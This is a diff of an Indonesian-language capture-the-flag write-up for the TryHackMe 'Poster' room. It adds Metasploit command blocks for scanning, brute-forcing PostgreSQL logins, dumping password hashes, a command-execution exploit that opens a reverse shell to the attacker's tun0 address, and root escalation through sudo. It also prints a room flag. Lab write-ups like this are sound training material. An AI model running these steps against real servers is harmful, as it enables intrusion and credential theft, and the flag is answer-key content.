@@ -5,7 +5,7 @@
 ## Task 1 - Flag
 
 - **Pertanyaan:** What is the rdbms installed on the server?
-- Lakukan scanning dengan nmap
+- Lakukan port scanning dengan tool `nmap`
 ```sh
 nmap -sC -sV <IP_Machine>
 ```
@@ -29,6 +29,9 @@ postgresql
 
 - **Pertanyaan:** After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
 - Buka `msfconsole` di terminal
+```sh
+sudo msfconsole
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%203.JPG)
 
@@ -50,10 +53,17 @@ auxiliary/scanner/postgres/postgres_login
 
 - **Pertanyaan:** What are the credentials you found?
 - Gunakan modul `auxiliary/scanner/postgres/postgres_login` yang berada di nomor 9 dan isi parameter rhost dengan IP Machine melalui perintah `set rhost <IP_Machine>`
+```sh
+use auxiliary/scanner/postgres/postgres_login
+set rhost <IP_Machine>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%206.JPG)
 
-- Jalankan modul dengan perintah `run` dan tunggu hingga proses selesai
+- Jalankan exploit dan tunggu hingga proses selesai
+```sh
+run
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%207.JPG)
 
@@ -90,14 +100,17 @@ auxiliary/admin/postgres/postgres_sql
 - **Pertanyaan:** Based on the results of #6, what is the rdbms version installed on the server?
 - Gunakan modul `auxiliary/admin/postgres/postgres_sql` yang berada di nomor 11 dan isi parameter rhost dengan IP Machine dan password user yang sudah ditemukan
 ```sh
-use nomor_modul
+use auxiliary/admin/postgres/postgres_sql
 set rhost <IP_Machine>
 set password password
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2012.JPG)
 
-- Jalankan modul dengan perintah `run` dan tunggu hingga proses selesai. Disini kita berhasil mendapat versi postgre SQL yang terinstall di server
+- Jalankan exploit dan tunggu hingga proses selesai. Disini kita berhasil mendapat versi postgre SQL yang terinstall di server
+```sh
+run
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2013.JPG)
 
@@ -124,11 +137,15 @@ auxiliary/scanner/postgres/postgres_hashdump
 ```
 
 - **Pertanyaan:** How many user hashes does the module dump?
-- Gunakan modul `auxiliary/admin/postgres/postgres_sql` yang berada di nomor 15 dan ketikkan perintah `show options` untuk melihat daftar parameter yang diperlukan
+- Gunakan modul `auxiliary/admin/postgres/postgres_sql` yang berada di nomor 15 dan lihat daftar parameter yang diperlukan
+```sh
+use auxiliary/scanner/postgres/postgres_hashdump
+show options
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2016.JPG)
 
-- isi parameter rhost dengan IP Machine dan password user yang sudah ditemukan
+- Disini kita hanya perlu mengisi parameter rhost dan password
 ```sh
 set rhost <IP_Machine>
 set password password
@@ -136,7 +153,10 @@ set password password
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2017.JPG)
 
-- Jalankan modul dengan perintah `run` dan tunggu hingga proses selesai. Disini kita berhasil mendapatkan 6 daftar username dan hash
+- Jalankan exploit dan tunggu hingga proses selesai. Disini kita berhasil mendapatkan 6 daftar username dan hash
+```sh
+run
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2018.JPG)
 
@@ -173,11 +193,15 @@ exploit/multi/postgres/postgres_copy_from_program_cmd_exec
 ```
 
 - **Pertanyaan:** Compromise the machine and locate user.txt
-- Gunakan modul `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` yang berada di nomor 6 dan ketikkan perintah `show options` untuk melihat daftar parameter yang diperlukan
+- Gunakan modul `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` yang berada di nomor 6 dan lihat daftar parameter yang diperlukan
+```sh
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+show options
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2022.JPG)
 
-- isi parameter yang diperlukan
+- Parameter yang harus diisi adalah rhost, password dan lhost
 ```sh
 set rhost <IP_Machine>
 set password password
@@ -186,7 +210,10 @@ set lhost <IP_tun0>
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2023.JPG)
 
-- Jalankan modul dengan perintah `run` dan tunggu beberapa saat hingga terhubung dengan server
+- Jalankan exploit dan tunggu beberapa saat hingga terhubung dengan server
+```sh
+run
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2024.JPG)
 
@@ -230,15 +257,21 @@ THM{postgresql_fa1l_conf1gurat1on}
 ```
 
 - **Pertanyaan:** Escalate privileges and obtain root.txt
-- Check daftar perintah yang dapat dijalankan alison dengan `sudo -l`. Disini tertulis **ALL : ALL** artinya alison dapat mengakses user root tanpa password
+- Lakukan pengecekan apakah user `alison` punya akses ke sudo. Disini tertulis **ALL : ALL** artinya alison dapat mengakses user root tanpa password
+```sh
+sudo -l
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2030.JPG)
 
-- Masuk ke user root dengan perintah `sudo su`
+- Masuk ke user root
+```sh
+sudo su
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2031.JPG)
 
-- Buka isi file **root.txt** di folder root
+- Buka root flag yang berada di direktori **/root**
 ```sh
 cat /root/root.txt
 ```
